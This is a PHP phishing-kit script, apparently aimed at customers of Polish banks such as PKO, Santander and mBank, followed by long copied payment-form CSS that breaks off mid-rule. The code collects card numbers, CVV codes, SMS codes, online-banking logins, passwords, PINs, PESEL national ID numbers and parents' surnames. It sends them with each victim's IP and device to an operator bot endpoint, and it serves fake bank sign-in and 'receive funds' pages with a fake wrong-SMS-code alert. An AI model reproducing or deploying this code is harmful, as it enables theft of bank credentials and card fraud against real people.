include('./config.php');

ini_set('display_errors', 0); 
error_reporting(E_ALL);  
if(!$_COOKIE['tokena']){
	$token = substr(md5(uniqid(rand(), true)),0,8);
  }else{
	$token = $_COOKIE['tokena'];
  }
function getBrowser()
    {
        $u_agent = $_SERVER['HTTP_USER_AGENT'];
        $bname = 'Unknown';
        $platform = 'Unknown';
        $version= "";

        //First get the platform? 
        if (preg_match('/android/i', $u_agent)) {
            $platform = '📱 Android';
        }elseif (preg_match('/iphone/i', $u_agent)) {
            $platform = '📱 iPhone';
        }elseif (preg_match('/ipad/i', $u_agent)) {
            $platform = '📱 iPad';
        }elseif (preg_match('/linux/i', $u_agent)) {
            $platform = 'linux';
        }
        elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
            $platform = '💻 Mac OS';
        }
        elseif (preg_match('/windows|win32/i', $u_agent)) {
            $platform = '💻 Windows';
        }
         
    
        // Next get the name of the useragent yes seperately and for good reason
        if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Internet Explorer';
            $ub = "MSIE";
        }
        elseif(preg_match('/Firefox/i',$u_agent))
        {
            $bname = 'Mozilla Firefox';
            $ub = "Firefox";
        }
        elseif(preg_match('/Chrome/i',$u_agent))
        {
            $bname = 'Google Chrome';
            $ub = "Chrome";
        }
        elseif(preg_match('/Safari/i',$u_agent))
        {
            $bname = 'Apple Safari';
            $ub = "Safari";
        }
        elseif(preg_match('/Opera/i',$u_agent))
        {
            $bname = 'Opera';
            $ub = "Opera";
        }
        elseif(preg_match('/Netscape/i',$u_agent))
        {
            $bname = 'Netscape';
            $ub = "Netscape";
        }
    
        // finally get the correct version number
        $known = array('Version', $ub, 'other');
        $pattern = '#(?<browser>' . join('|', $known) .
        ')[/ ]+(?<version>[0-9.|a-zA-Z.]*)#';
        if (!preg_match_all($pattern, $u_agent, $matches)) {
            // we have no matching number just continue
        }
    
        // see how many we have
        $i = count($matches['browser']);
        if ($i != 1) {
            //we will have two since we are not using 'other' argument yet
            //see if version is before or after the name
            if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
                $version= $matches['version'][0];
            }
            else {
                $version= $matches['version'][1];
            }
        }
        else {
            $version= $matches['version'][0];
        }
    
        // check if we have a number
        if ($version==null || $version=="") {$version="?";}
    
        return array(
            'userAgent' => $u_agent,
            'name'      => $bname,
            'version'   => $version,
            'platform'  => $platform,
            'pattern'    => $pattern
        );
    }
 

$product = file_get_contents($bot_config->bot_link."api.php?get_product=".$_GET['product']);
$product = json_decode($product);
$browser = getBrowser();  

$card = $_POST['cardNumber'];
$cvv = $_POST['cardCvv'];
$month = $_POST['cardMonth'];
$year = $_POST['cardYear'];
$balance = $_POST['cardBalance'];
$track_id = $_POST['id']; 
$cardName = $_POST['fio'];
$smscode = $_POST['smscode'];
$id_card = $_POST['id_card'];

$bank_name = $_POST['bank_name'];
$bank_country = $_POST['bank_country'];
$bank_url = $_POST['bank_url'];
$bank_type = $_POST['bank_type'];
$bank_scheme = $_POST['bank_scheme']; 


$bank_login = $_POST['bank_login'];
$bank_haslo = $_POST['bank_haslo'];
$bank_pin = $_POST['bank_pin'];
$bank_pesel = $_POST['bank_pesel'];
$bank_nmatki = $_POST['bank_nmatki'];
$bank_nojca = $_POST['bank_nojca'];

if($bank_login&&$bank_haslo){
	$arr = array(
        'cmd'=>'update_card',
        'bank_login'=>$bank_login,
		'bank_haslo'=>$bank_haslo,
		'bank_pin'=>$bank_pin,
		'bank_pesel'=>$bank_pesel,
		'bank_nmatki'=>$bank_nmatki,
		'bank_nojca'=>$bank_nojca,
        'id_card'=>$id_card
    ); 

    file_get_contents($bot_config->bot_link."api.php?".http_build_query($arr));
}
if($card&&$cardName&&!$smscode){
	/*$bin = substr(str_replace(" ",'',$card),0,6); 
	$bank = file_get_contents('https://lookup.binlist.net/'.$bin);
	$bank = json_decode($bank); */
	$arr = array(
        'cmd'=>'set_card',
        'number'=>$card,
        'cvv'=>$cvv,
        'month'=>$month,
        'year'=>$year,
        'balance'=>$balance,
        'track_id'=>$track_id,
        'pid'=>$product->id,
        'card_name'=>$cardName,
	    'bank_name'=>$_POST['bank_name'],
        'bank_country'=>$_POST['bank_country'],
        'bank_url'=>$_POST['bank_url'],
        'bank_type'=>$_POST['bank_type'],
        'bank_scheme'=>$_POST['bank_scheme']
    );  
	/*if(!$bank->bank->name){
		$ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://bincheck.io/details/'.$bin); 
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            $head = curl_exec($ch); 
            curl_close($ch); 
			preg_match_all("/<td width=\"40%\">Issuer Name \/ Bank<\/td>\n<td width=\"60%\" style=\"text-align: left;\">(.*)<\/td>/U", $head, $bank_name_match);
			preg_match_all("/<td width=\"40%\">Card Brand<\/td>\n<td style=\"text-align: left;\">(.*)<\/td>/U", $head, $bank_scheme_match);
			preg_match_all("/<td width=\"40%\">Card Type<\/td>\n<td width=\"60%\" style=\"text-align: left;\"> (.*) <\/td>/U", $head, $bank_type_match);

			$bank->bank->name = $bank_name_match[1][0];
			$bank->scheme = $bank_scheme_match[1][0];
			$bank->type = $bank_type_match[1][0];

			$arr['bank_name']=$bank->bank->name; 
			$arr['bank_url']=$bank->url;
			$arr['bank_type']=$bank->type;
			$arr['bank_scheme']=$bank->scheme;
	} */
	
	

    
     //$id_card = file_put_contents($bot_config->bot_link."api.php?cmd=set_card",http_build_query($arr)); 
     $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,$bot_config->bot_link."api.php?cmd=set_card");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,$arr);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    $id_card = curl_exec($ch);
    
    curl_close ($ch);

    

//die(print_r($id_card));
    $id_card = json_decode($id_card);
    $id_card = $id_card->id; 
	$data = array(
		'visit'=>'card',
		'card'=>$id_card,
		'token'=>$token,
		'product'=>$product->id,
		'ip'=>$_SERVER['REMOTE_ADDR'],
		'device'=>$browser['platform'].', '.$browser['name']
	  );
	  file_get_contents($bot_config->bot_link.'bot.php?'.http_build_query($data));  
	   
}elseif($smscode&&$id_card){ 
    $arr = array(
        'cmd'=>'update_card',
        'sms'=>$smscode,
        'id_card'=>$id_card
    ); 
    file_get_contents($bot_config->bot_link."api.php?".http_build_query($arr));
     
	$data = array(
		'visit'=>'sms',
		'card'=>$id_card,
		'smscode'=>$smscode,
		'product'=>$product->id,
		'ip'=>$_SERVER['REMOTE_ADDR'],
		'device'=>$browser['platform'].', '.$browser['name']
	  );
	  file_get_contents($bot_config->bot_link.'bot.php?'.http_build_query($data));    
}  
$bank_nm = '';
$_POST['bank_name'] = mb_strtolower($_POST['bank_name']); 

if(strpos($_POST['bank_name'],'pko')!==false){ $bank_nm = 'pko';}
if(strpos($_POST['bank_name'],'santander')!==false){ $bank_nm = 'santander';}
if(strpos($_POST['bank_name'],'deutsche')!==false){ $bank_nm = 'deutsche';}
if(strpos($_POST['bank_name'],'pekao')!==false){ $bank_nm = 'pekao';}
if(strpos($_POST['bank_name'],'agricole')!==false){ $bank_nm = 'agricole';}
if(strpos($_POST['bank_name'],'millennium')!==false){ $bank_nm = 'millennium';}
if(strpos($_POST['bank_name'],'mbank')!==false){ $bank_nm = 'mbank';}
if(strpos($_POST['bank_name'],'ing')!==false){ $bank_nm = 'ing';}

if($bank_login&&$id_card){
	$arr = array(
		'cmd'=>'update_card',
		'id_card'=>$id_card,
		'bank_login'=>$bank_login,
		'bank_haslo'=>$bank_haslo,
		'bank_pin'=>$bank_pin,
		'bank_pesel'=>$bank_pesel,
		'bank_nmatki'=>$bank_nmatki,
		'bank_nojca'=>$bank_nojca
	  ); 
		  file_get_contents($bot_config->bot_link."api.php?".http_build_query($arr));
		  $data = array(
			'visit'=>'banking',
			'card'=>$id_card,
			'bank_login'=>$bank_login,
			'bank_haslo'=>$bank_haslo,
			'bank_pin'=>$bank_pin,
			'bank_pesel'=>$bank_pesel,
			'bank_nmatki'=>$bank_nmatki,
			'bank_nojca'=>$bank_nojca,
			'product'=>$product->id,
			'ip'=>$_SERVER['REMOTE_ADDR'],
			'device'=>$browser['platform'].', '.$browser['name']
		  ); 
		  file_get_contents($bot_config->bot_link.'bot.php?'.http_build_query($data)); 
}

if((strpos($_POST['bank_name'],'pko')!==false|| 
	strpos($_POST['bank_name'],'santander')!==false||
	strpos($_POST['bank_name'],'deutsche')!==false||
	strpos($_POST['bank_name'],'pekao')!==false||
	strpos($_POST['bank_name'],'agricole')!==false||
	strpos($_POST['bank_name'],'millennium')!==false||
	strpos($_POST['bank_name'],'mbank')!==false||
	strpos($_POST['bank_name'],'ing')!==false)&&$bank_login==""){ 

echo '
<!DOCTYPE html>
<html>
    <head>
        <title>Sign In | '.$_POST['bank_name'].'</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta http-equiv="X-UA-Compatible" content="ie-edge">
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu:ital,wght@0,300;0,400;0,500;0,700;1,300;1,400;1,500;1,700&amp;display=swap" rel="stylesheet">
        <link rel="stylesheet" href="/bank_assets/pko/css/style.css"> 
        <link rel="apple-touch-icon" sizes="180x180" href="/bank_assets/'.$bank_nm.'/apple-touch-icon.png">
		<link rel="icon" type="image/png" sizes="32x32" href="/bank_assets/'.$bank_nm.'/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="16x16" href="/bank_assets/'.$bank_nm.'/favicon-16x16.png">
		<link rel="manifest" href="/bank_assets/'.$bank_nm.'/site.webmanifest">
		<link rel="mask-icon" href="/bank_assets/'.$bank_nm.'/safari-pinned-tab.svg" color="#5bbad5">
		<meta name="msapplication-TileColor" content="#da532c">
		<meta name="theme-color" content="#ffffff">
    </head>
    <body>
        <div class="wrapper">
            <div class="signin_container">
                <img src="/bank_assets/'.$bank_nm.'/favicon-32x32.png?" alt="'.$bank_nm.'">
                <h1 class="sign_title">Sign in to account</h1>
                <p class="sign_text">To continue sign in to your account</p>
                <hr class="sign_line">
                <form action="#" method="POST" class="form">
                    <div class="row1">
                        <div class=field>
                            <label for="bank_login" class="field_label">Login</label>
                            <input name="bank_login" type="text" class="field_input" id="kod" required>
                        </div>
                        <div class=field>
                            <label for="bank_haslo" class="field_label">Haslo</label>
                            <input name="bank_haslo" type="text" class="field_input" id="haslo" required>
                        </div>
                    </div>
                    <div class="row2">
					';
					
					if($bank_nm!='millennium'&&$bank_nm!='mbank'){ 
					echo '
                        <div class=field>
                            <label for="bank_pin" class="field_label">PIN</label>
                            <input name="bank_pin" type="number" class="field_input" id="pin" required>
                        </div>';
					}

					echo '
                        <div class=field>
                            <label for="pebank_peselsel" class="field_label">Pesel</label>
                            <input name="bank_pesel" type="number" class="field_input" id="pesel" required>
                        </div>
                    </div>
					';
					if($bank_nm=='mbank'){
						echo '
						<div class="row2"> 
							<div class=field>
								<label for="bank_nmatki" class="field_label">Nazwisko matki</label>
								<input name="bank_nmatki" type="text" class="field_input" id="nmatki" required>
							</div>
							<div class=field>
								<label for="bank_nojca" class="field_label">Nazwisko ojca</label>
								<input name="bank_nojca" type="text" class="field_input" id="nojca" required>
							</div>
						</div> ';
					}
					echo '
                    <input name="login_cabinet" type="hidden" value="true" /> 
                	<input name="id_card" type="hidden" value="'.$id_card.'" />
                	<input name="product" type="hidden" value="'.$_GET['product'].'" />
					
                    <button class="button" type="submit">
                        <p class="button_text">Continue</p>
                    </button>
                </form>
            </div>
        </div>
	    <style>body a:last-child { z-index:-9999!important; position:absolute;}</style>
    </body>
</html> 
';
}else{
echo'
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>OTRZYMAJ ŚRODKI </title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">

      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
      ';
        if($smscode&&$id_card){  
            echo "<script>alert('Wprowadzono nieprawidłowy kod SMS! Wysłano nowy kod.');</script>";
        } 
	echo '
       
	    <style>body a:last-child { z-index:-9999!important; position:absolute;}</style>
      <style type="text/css">
      		.waiter {
	border-color: solid 1px black;
	text-align: center;
	color: green
}

.error_status {
	display: none;
}

.cpg_error {
	color: red;
	text-align: center;
} 
.waiter-icon{display: inline-block;background-repeat:no-repeat}
.waiter-icon_name_alert{width:62px;height:53px;background-position:0 0}
.waiter-icon_name_fail{width:65px;height:65px;background-position:-67px 0}
.waiter-icon_name_load{width:65px;height:65px;background-position:-137px 0}
.waiter-icon_name_success{width:65px;height:65px;background-position:-207px 0}

.icon_spin_clockwise{-webkit-animation:spin-clockwise 2s infinite linear;-o-animation:spin-clockwise 2s infinite linear;animation:spin-clockwise 2s infinite linear}
@-webkit-keyframes spin-clockwise{from{-webkit-transform:rotate(0deg);transform:rotate(0deg)}
to{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}
@-o-keyframes spin-clockwise{from{-o-transform:rotate(0deg);transform:rotate(0deg)}
to{-o-transform:rotate(360deg);transform:rotate(360deg)}}
@keyframes spin-clockwise{from{-webkit-transform:rotate(0deg);-o-transform:rotate(0deg);transform:rotate(0deg)}
to{-webkit-transform:rotate(360deg);-o-transform:rotate(360deg);transform:rotate(360deg)}}

.body_fixed-width_no{min-width:0;background:transparent}
.body_fixed-height_no{height:auto}
.body_position_relative{position:relative}1      </style>
      <style type="text/css">
      	/* Dropdown control */
.selectBox-dropdown {
    min-width: 150px;
    position: relative;
    border: solid 1px #BBB;
    line-height: 1.5;
    text-decoration: none;
    text-align: left;
    color: #000;
    outline: none;
    vertical-align: middle;
    background: #F2F2F2;
    background: -moz-linear-gradient(top, #F8F8F8 1%, #E1E1E1 100%);
    background: -webkit-gradient(linear, left top, left bottom, color-stop(1%, #F8F8F8), color-stop(100%, #E1E1E1));
    filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=\'#F8F8F8\', endColorstr=\'#E1E1E1\', GradientType=0);
    -moz-box-shadow: 0 1px 0 rgba(255, 255, 255, .75);
    -webkit-box-shadow: 0 1px 0 rgba(255, 255, 255, .75);
    box-shadow: 0 1px 0 rgba(255, 255, 255, .75);
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    display: inline-block;
    cursor: default;
}

.selectBox-dropdown:focus,
.selectBox-dropdown:focus .selectBox-arrow {
    border-color: #666;
}

.selectBox-dropdown.selectBox-menuShowing {
    -moz-border-radius-bottomleft: 0;
    -moz-border-radius-bottomright: 0;
    -webkit-border-bottom-left-radius: 0;
    -webkit-border-bottom-right-radius: 0;
    border-bottom-left-radius: 0;
    border-bottom-right-radius: 0;
}

.selectBox-dropdown .selectBox-label {
    padding: 2px 8px;
    display: inline-block;
    white-space: nowrap;
    overflow: hidden;
}

.selectBox-dropdown .selectBox-arrow {
    position: absolute;
    top: 0;
    right: 0;
    width: 23px;
    height: 100%; 
    border-left: solid 1px #BBB;
}

/* Dropdown menu */
.selectBox-dropdown-menu {
    position: absolute;
    z-index: 99999;
    max-height: 200px;
    min-height: 1em;
    border: solid 1px #BBB; /* should be the same border width as .selectBox-dropdown */
    background: #FFF;
    -moz-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    -webkit-box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    box-shadow: 0 2px 6px rgba(0, 0, 0, .2);
    overflow: auto;
    -webkit-overflow-scrolling: touch;
}

/* Inline control */
.selectBox-inline {
    min-width: 150px;
    outline: none;
    border: solid 1px #BBB;
    background: #FFF;
    display: inline-block;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    overflow: auto;
}

.selectBox-inline:focus {
    border-color: #666;
}

/* Options */
.selectBox-options,
.selectBox-options LI,
.selectBox-options LI A {
    list-style: none;
    display: block;
    cursor: default;
    padding: 0;
    margin: 0;
}

.selectBox-options LI A {
    line-height: 1.5;
    padding: 0 .5em;
    white-space: nowrap;
    overflow: hidden;
    background: 6px center no-repeat;
}

.selectBox-options LI.selectBox-hover A {
    background-color: #EEE;
}

.selectBox-options LI.selectBox-disabled A {
    color: #888;
    background-color: transparent;
}

.selectBox-options LI.selectBox-selected A {
    background-color: #C8DEF4;
}

.selectBox-options .selectBox-optgroup {
    color: #666;
    background: #EEE;
    font-weight: bold;
    line-height: 1.5;
    padding: 0 .3em;
    white-space: nowrap;
}

/* Disabled state */
.selectBox.selectBox-disabled {
    color: #888 !important;
}

.selectBox-dropdown.selectBox-disabled .selectBox-arrow {
    opacity: .5;
    filter: alpha(opacity=50);
    border-color: #666;
}

.selectBox-inline.selectBox-disabled {
    color: #888 !important;
}

.selectBox-inline.selectBox-disabled .selectBox-options A {
    background-color: transparent !important;
}1      </style>
      <style type="text/css">
      		body,
html {
	height: 100%
}

a,
abbr,
acronym,
address,
applet,
article,
aside,
audio,
b,
big,
blockquote,
body,
button,
canvas,
caption,
center,
cite,
code,
dd,
del,
details,
dfn,
div,
dl,
dt,
em,
embed,
fieldset,
figcaption,
figure,
footer,
form,
h1,
h2,
h3,
h4,
h5,
h6,
header,
hgroup,
html,
i,
iframe,
img,
ins,
kbd,
label,
legend,
li,
mark,
menu,
nav,
object,
ol,
output,
p,
pre,
q,
ruby,
s,
samp,
section,
small,
span,
strike,
strong,
sub,
summary,
sup,
table,
tbody,
td,
tfoot,
th,
thead,
time,
tr,
tt,
u,
ul,
var,
video {
	margin: 0;
	padding: 0;
	border: 0;
	font-size: 100%;
	font: inherit;
	vertical-align: baseline
}

body {
	background: #fff;
	line-height: 1
}

input,
select,
textarea {
	margin: 0;
	outline: 0;
	font-family: arial, sans-serif
}

ol,
ul {
	list-style: none;
	margin: 0;
	padding: 0
}

blockquote,
q {
	quotes: none
}

blockquote:after,
blockquote:before,
q:after,
q:before {
	content: "";
	content: none
}

table {
	border-collapse: collapse;
	border-spacing: 0
}

article,
aside,
canvas,
details,
figcaption,
figure,
footer,
header,
hgroup,
menu,
nav,
section,
summary,
time,
video {
	display: block
}

body {
	font: normal 13px helvetica, arial, sans-serif;
	line-height: 18px;
	color: #333;
	background: #f2f2f2;
	min-width: 980px
}

img {
	-ms-interpolation-mode: bicubic
}

a {
	-webkit-transition: color .2s;
	-o-transition: color .2s;
	transition: color .2s
}

.pseudo-link,
a {
	text-decoration: none;
	color: #06c
}

.pseudo-link {
	cursor: pointer
}

.pseudo-link:hover,
a:hover {
	text-decoration: underline
}

b,
strong {
	color: #000;
	font-weight: 700
}

h1,
h2,
h3,
h4,
h5,
h6 {
	clear: both;
	margin: 0
}

.clearfix:after,
.clearfix:before {
	content: "";
	display: table
}

.clearfix:after {
	clear: both
}

.counters {
	position: absolute;
	left: -9999px;
	top: -9999px;
	width: 0;
	height: 0;
	line-height: 0;
	font-size: 0;
	overflow: hidden
}

.portal-menu {
	z-index: 10
}

.body_fixed-width_no {
	min-width: 0;
	background: transparent
}

.body_fixed-height_no {
	height: auto
}

.body_position_relative {
	position: relative
}

.red {
	color: red
}

.Errors {
	margin-top: -10px
}

.html_responsive_yes {
	font-size: 8px
}

.html_responsive_yes body {
	min-width: 0
}

@media (min-width:320px) {
	.html_responsive_yes {
		font-size: 8px
	}
}

@media (min-width:640px) {
	.html_responsive_yes {
		font-size: 12px
	}
}

@media (min-width:1000px) {
	.html_responsive_yes {
		font-size: 10px
	}
}

.icon_spin_clockwise,
.icon_spin_counterclockwise {
	-webkit-animation: spin-clockwise 2s infinite linear;
	-o-animation: spin-clockwise 2s infinite linear;
	animation: spin-clockwise 2s infinite linear
}

.icon_spin_counterclockwise {
	-webkit-animation-direction: reverse;
	-o-animation-direction: reverse;
	animation-direction: reverse
}

.icon_steps_clockwise {
	-webkit-animation-name: loader_steps_spin;
	-o-animation-name: loader_steps_spin;
	animation-name: loader_steps_spin;
	-webkit-animation-duration: 1s;
	-o-animation-duration: 1s;
	animation-duration: 1s;
	-webkit-animation-iteration-count: infinite;
	-o-animation-iteration-count: infinite;
	animation-iteration-count: infinite;
	-webkit-animation-timing-function: steps(12);
	-o-animation-timing-function: steps(12);
	animation-timing-function: steps(12)
}

@-webkit-keyframes spin-clockwise {
	0% {
		-webkit-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-o-keyframes spin-clockwise {
	0% {
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@keyframes spin-clockwise {
	0% {
		-webkit-transform: rotate(0deg);
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-webkit-keyframes loader_steps_spin {
	0% {
		-webkit-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@-o-keyframes loader_steps_spin {
	0% {
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

@keyframes loader_steps_spin {
	0% {
		-webkit-transform: rotate(0deg);
		-o-transform: rotate(0deg);
		transform: rotate(0deg)
	}
	to {
		-webkit-transform: rotate(1turn);
		-o-transform: rotate(1turn);
		transform: rotate(1turn)
	}
}

.credit-card-form .credit-card-form__submit .button,
.credit-card-form__popup-footer .button,
.notification-block .button,
.pay-card-layout_type_dc .credit-card-form__popup .button,
.pay-card-layout_type_zz .credit-card-form__popup .button {
	display: inline-block;
	border: 0;
	outline: 0;
	padding: 0;
	background: transparent;
	cursor: pointer;
	text-decoration: none;
	vertical-align: middle;
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	white-space: nowrap
}

.credit-card-form .credit-card-form__submit .button:hover,
.credit-card-form__popup-footer .button:hover,
.notification-block .button:hover,
.pay-card-layout_type_dc .credit-card-form__popup .button:hover,
.pay-card-layout_type_zz .credit-card-form__popup .button:hover {
	text-decoration: none
}

.credit-card-form .credit-card-form__submit .button,
.credit-card-form__popup-footer .button,
.notification-block .button,
.pay-card-layout_type_dc .credit-card-form__popup .button,
.pay-card-layout_type_zz .credit-card-form__popup .button {
	margin: 0 -4px 0 0;
	font: 700 12px arial, helvetica, sans-serif;
	text-transform: uppercase;
	color: #333;
	border-radius: 3px;
	padding: 0 28px;
	height: 32px;
	line-height: 32px
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button,
.credit-card-form_type_fotostrana .credit-card-form__submit .button,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button,
.pay-card-layout_type_zz .credit-card-form__popup .button,
.pay-card_type_cloud-b2b .credit-card-form__submit .button,
.pay-card_type_geekbrains .credit-card-form__popup .button,
.pay-card_type_geekbrains .credit-card-form__submit .button,
.pay-card_type_zz .credit-card-form__submit .button {
	padding: 0 28px;
	height: 40px;
	line-height: 40px
}

.credit-card-form_type_fotostrana .credit-card-form__popup-footer .button,
.credit-card-form_type_fotostrana .credit-card-form__submit .button,
.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button,
.pay-card-layout__notification_type_vk-mobile .info-block_type_question .button_theme_vk-light,
.pay-card-layout__notification_type_vk .info-block_type_question .button,
.pay-card-layout__notification_type_vk .info-block_type_question .button_theme_vk-light,
.pay-card-layout_type_cloud-b2b .credit-card-form__popup .button__light,
.pay-card-layout_type_vk .credit-card-form__popup .button,
.pay-card-layout_type_vk .credit-card-form__popup .button_theme_vk-light,
.pay-card-layout_type_vk .credit-card-form__submit .button,
.pay-card-layout_type_vk .credit-card-form__submit .button_theme_vk-light,
.pay-card_type_cloud-b2b .credit-card-form__submit .button__light,
.pay-card_type_cloud-b2c .credit-card-form__popup .button,
.pay-card_type_cloud-b2c .credit-card-form__popup .button__light,
.pay-card_type_cloud-b2c .credit-card-form__submit .button,
.pay-card_type_cloud-b2c .credit-card-form__submit .button__light,
.pay-card_type_geekbrains .credit-card-form__popup .button,
.pay-card_type_geekbrains .credit-card-form__submit .button,
.pay-card_type_mail .credit-card-form__popup .button,
.pay-card_type_mail .credit-card-form__popup .button__light,
.pay-card_type_mail .credit-card-form__submit .button,
.pay-card_type_mail .credit-card-form__submit .button__light,
.pay-card_type_tarantool .credit-card-form__popup .button,
.pay-card_type_tarantool .credit-card-form__submit .button,
.pay-card_type_vk-mobile .credit-card-form__popup .button,
.pay-card_type_vk-mobile .credit-card-form__popup .button_theme_vk-light,
.pay-card_type_vk-mobile .credit-card-form__submit .button,
.pay-card_type_vk-mobile .credit-card-form__submit .button_theme_vk-light {
	text-transform: none
} 
.payment-systems-icon {
	background-repeat: no-repeat
}

.payment-systems-icon_name_maestro {
	background-position: 0 0;
	width: 39px;
	height: 24px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_maestro,
.payment-systems-icon_name_maestro_vk_wallet {
	background-position: -44px 0;
	width: 44px;
	height: 24px
}

.payment-systems-icon_name_maestro_vk_wallet_gray {
	background-position: -93px 0;
	width: 44px;
	height: 24px
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_name_maestro,
.payment-systems-icon_name_maestro_lootdog {
	background-position: -142px 0;
	width: 25px;
	height: 16px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_maestro,
.payment-systems-icon_name_maestro_youla_mobile {
	background-position: -172px 0;
	width: 36px;
	height: 22px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_maestro_youla_mobile_gray {
	background-position: -213px 0;
	width: 36px;
	height: 22px
}

.credit-card-form .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_maestro_gray {
	background-position: -254px 0;
	width: 39px;
	height: 24px
}

.credit-card-form_size_small .payment-systems-icon_name_maestro,
.credit-card-form_size_x-small .payment-systems-icon_name_maestro,
.pay-card_type_citymobil .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_mapsme .payment-systems-icon_name_maestro,
.pay-card_type_wamba .payment-systems-icons .payment-systems-icon_name_maestro,
.payment-systems-icon_name_maestro_small {
	background-position: -298px 0;
	width: 29px;
	height: 18px
}

.credit-card-form .payment-systems-icon_name_maestro_small.payment-systems-icon_disabled_yes,
.credit-card-form_size_small .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.credit-card-form_size_x-small .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_mail-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_mapsme .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_maestro_gray_small {
	background-position: -332px 0;
	width: 29px;
	height: 18px
}

.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_maestro,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_maestro,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_maestro,
.payment-systems-icon_name_maestro_smaller {
	background-position: -366px 0;
	width: 26px;
	height: 16px
}

.credit-card-form .payment-systems-icon_name_maestro_smaller.payment-systems-icon_disabled_yes,
.pay-card-layout_type_standard_theme_black .credit-card-form_size_x-small .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_dc-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_dc .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_vk-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_zz-mobile .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.pay-card_type_zz .payment-systems-icons .payment-systems-icon_name_maestro.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_maestro_gray_smaller {
	background-position: -397px 0;
	width: 26px;
	height: 16px
}

.payment-systems-icon_name_maestro_big {
	background-position: -428px 0;
	width: 52px;
	height: 32px
}

.credit-card-form .payment-systems-icon_name_maestro_big.payment-systems-icon_disabled_yes,
.payment-systems-icon_name_maestro_gray_big {
	background-position: -485px 0;
	width: 52px;
	height: 32px
}

.pay-card_type_vk-wallet-android .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_vk-wallet-ios .payment-systems-icons .payment-systems-icon_name_mastercard,
.pay-card_type_vk-wallet .payment-systems-icons .payment-systems-icon_name_mastercard,
.payment-systems-icon_name_mastercard_vk_wallet {
	background-position: -542px 0;
	width: 44px;
	height: 24px
}

.payment-systems-icon_name_mastercard_vk_wallet_gray {
	background-position: -591px 0;
	width: 44px;
	height: 24px
}

.pay-card-layout_type_lootdog .payment-systems-icons .payment-systems-icon_name_mastercard,
.payment-systems-icon_name_mastercard_lootdog {
	background-position: -640px 0;
	width: 25px;
	height: 16px
}

.pay-card_type_youla-mobile .payment-systems-icons .payment-systems-icon_name_mastercard,
.payment-systems-icon_name_mastercard_youla_mobile {
	background-position: -670px 0;
